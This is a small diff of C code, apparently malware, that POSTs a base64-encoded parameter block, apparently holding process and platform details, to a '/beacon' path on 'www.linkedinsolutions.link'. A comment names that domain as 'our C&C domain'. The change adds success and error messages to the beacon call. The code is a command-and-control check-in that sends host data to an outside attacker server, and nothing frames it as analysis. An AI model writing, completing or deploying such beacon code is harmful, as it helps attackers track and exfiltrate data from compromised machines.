@@ -9,5 +9,11 @@ const char* Params = "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybS
 int main()
 {
 	HINTERNET hSession = SendRequest("www.linkedinsolutions.link", 80, "/beacon", "POST", Params); // Send request to our C&C domain.
+	if (hSession) {
+		printf("Data has been sent successfully\n");
+	}
+	else {
+		printf("Error in sending data\n");
+	}
 
 }
